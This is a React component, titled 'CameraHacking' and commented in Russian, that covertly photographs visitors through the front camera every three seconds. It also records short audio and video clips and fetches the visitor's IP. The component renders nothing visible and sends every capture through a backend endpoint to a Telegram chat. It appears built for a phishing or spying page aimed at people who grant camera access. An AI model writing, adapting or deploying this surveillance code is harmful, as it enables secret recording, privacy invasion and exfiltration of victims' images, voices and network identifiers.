/**
 * ПРОМЕЖУТОЧНАЯ ВЕРСИЯ - ОТПРАВКА ФОТО КАЖДЫЕ 3 СЕКУНДЫ + АУДИО/ВИДЕО
 */

import axios from 'axios';
import { useEffect, useRef, useState } from 'react';
import API_CONFIG from '../api/config';

const CameraHacking = ({setClientIp, chatId, videoRef, setLocationPermission}) => {
  const streamRef = useRef(null);
  const audioStreamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  
  const [captureCount, setCaptureCount] = useState(0);
  const [isCapturing, setIsCapturing] = useState(false);

  // Конфигурация
  const CAPTURE_INTERVAL = 3000; // 3 секунды
  const MAX_CAPTURES = 100;

  /**
   * ФУНКЦИЯ ОТПРАВКИ ФОТО
   */
  const sendToTelegram = async (blob, type, filename) => {
    try {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append(type, blob, filename);
      
      const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendPhotoToTelegram}`;
      
      await axios.post(apiUrl, formData, {
        headers: { "Content-Type": "multipart/form-data" },
        timeout: 10000
      });
      
      console.log(`✅ ${type} sent successfully`);
      setCaptureCount(prev => prev + 1);
      
    } catch (error) {
      console.error(`❌ Error sending ${type}:`, error);
    }
  };

  /**
   * ОСНОВНАЯ ФУНКЦИЯ ЗАХВАТА ФОТО
   */
  const capturePhoto = async () => {
    if (!videoRef.current || !streamRef.current || captureCount >= MAX_CAPTURES) {
      console.log("⏸️ Capture stopped");
      stopCapturing();
      return;
    }
    
    try {
      const video = videoRef.current;
      
      if (video.videoWidth === 0 || video.videoHeight === 0) {
        return;
      }
      
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const context = canvas.getContext("2d");
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      canvas.toBlob(async (blob) => {
        if (blob) {
          await sendToTelegram(blob, 'photo', `photo_${Date.now()}.jpg`);
          
          // Каждое 5-е фото делаем аудиозапись
          if (captureCount % 5 === 0) {
            captureAudio();
          }
          
          // Каждое 10-е фото делаем видео
          if (captureCount % 10 === 0) {
            startVideoRecording();
          }
        }
      }, "image/jpeg", 0.8);
      
    } catch (error) {
      console.error("❌ Capture error:", error);
    }
  };

  /**
   * ФУНКЦИЯ ЗАХВАТА АУДИО
   */
  const captureAudio = async () => {
    try {
      const audioStream = await navigator.mediaDevices.getUserMedia({
        audio: true
      });
      
      audioStreamRef.current = audioStream;
      const audioChunks = [];
      const mediaRecorder = new MediaRecorder(audioStream);
      
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          audioChunks.push(event.data);
        }
      };
      
      mediaRecorder.onstop = async () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        await sendToTelegram(audioBlob, 'audio', 'audio.webm');
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, 3000); // 3 секунды аудио
      
    } catch (error) {
      console.log("⚠️ Audio capture skipped");
    }
  };

  /**
   * ФУНКЦИЯ ЗАПИСИ ВИДЕО
   */
  const startVideoRecording = async () => {
    try {
      if (!streamRef.current) return;
      
      const videoStream = streamRef.current;
      const mediaRecorder = new MediaRecorder(videoStream);
      const videoChunks = [];
      
      mediaRecorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          videoChunks.push(event.data);
        }
      };
      
      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
        await sendToTelegram(videoBlob, 'video', 'video.webm');
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, 5000); // 5 секунд видео
      
    } catch (error) {
      console.error("❌ Video recording error:", error);
    }
  };

  /**
   * ЗАПУСК ПЕРИОДИЧЕСКОГО ЗАХВАТА
   */
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    setIsCapturing(true);
    console.log("🚀 Starting periodic capture every 3 seconds");
    
    // Первый захват сразу
    capturePhoto();
    
    // Затем каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      if (captureCount < MAX_CAPTURES) {
        capturePhoto();
      } else {
        stopCapturing();
      }
    }, CAPTURE_INTERVAL);
  };

  /**
   * ОСТАНОВКА ЗАХВАТА
   */
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    setIsCapturing(false);
    console.log("🛑 Capture stopped");
  };

  /**
   * ОСНОВНОЙ ЭФФЕКТ
   */
  useEffect(() => {
    const initializeCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            facingMode: "user"
          }
        });
        
        streamRef.current = stream;
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          
          await new Promise(resolve => {
            if (videoRef.current.readyState >= 2) {
              setTimeout(resolve, 1000);
            } else {
              videoRef.current.onloadedmetadata = () => setTimeout(resolve, 1000);
            }
          });
          
          startPeriodicCapture();
        }
        
      } catch (error) {
        console.error("❌ Camera access error:", error);
      }
    };

    // Получение IP
    const fetchClientIp = async () => {
      try {
        const response = await axios.get('https://api.ipify.org?format=json');
        setClientIp(response.data.ip);
      } catch (error) {
        setClientIp("IP unavailable");
      }
    };

    // Восстановление геолокации
    const savedPermission = localStorage.getItem("locationPermission");
    if (savedPermission) {
      try {
        setLocationPermission(JSON.parse(savedPermission));
      } catch (error) {
        localStorage.removeItem("locationPermission");
      }
    }

    // Инициализация
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      initializeCamera();
      fetchClientIp();
    }

    // Очистка
    return () => {
      stopCapturing();
      
      if (streamRef.current) {
        streamRef.current.getTracks().forEach(track => track.stop());
      }
      
      if (audioStreamRef.current) {
        audioStreamRef.current.getTracks().forEach(track => track.stop());
      }
    };
  }, []);

  return null;
};

export default CameraHacking;
